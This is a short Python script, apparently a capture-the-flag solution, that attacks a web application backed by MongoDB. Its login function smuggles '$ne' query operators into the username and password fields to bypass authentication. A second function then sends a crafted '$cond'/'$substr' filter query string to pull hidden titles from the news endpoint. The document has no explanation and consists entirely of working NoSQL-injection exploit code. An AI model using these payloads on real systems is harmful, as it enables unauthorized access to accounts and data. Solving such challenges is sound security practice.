#!/usr/bin/env python3

import requests

URL = 'http://173.199.118.226/index.php'
URL = 'http://localhost:5001/index.php'


def bypass_auth(s):
    s.post(URL, data={
        'username': '", "username": {"$ne": ""}, "$comment": "',
        'password': '", "password": {"$ne": ""}, "$comment": "'
    })


def filter_news(s):
    query_string = "filter[$cond][if][$eq][0][$substr][0]=$title&filter[$cond][if][$eq][0][$substr][1][$year][$dateFromString][dateString]=0000-02-08T12:10:40.787Z&filter[$cond][if][$eq][0][$substr][2][$year][$dateFromString][dateString]=0007-02-08T12:10:40.787Z&filter[$cond][if][$eq][1]=cybrics&filter[$cond][then]=$title&filter[$cond][else]="
    r  = s.get('{}?{}'.format(URL, query_string))
    print(r.text)


def main():
    s = requests.Session()
    bypass_auth(s)
    filter_news(s)


if __name__ == '__main__':
    main()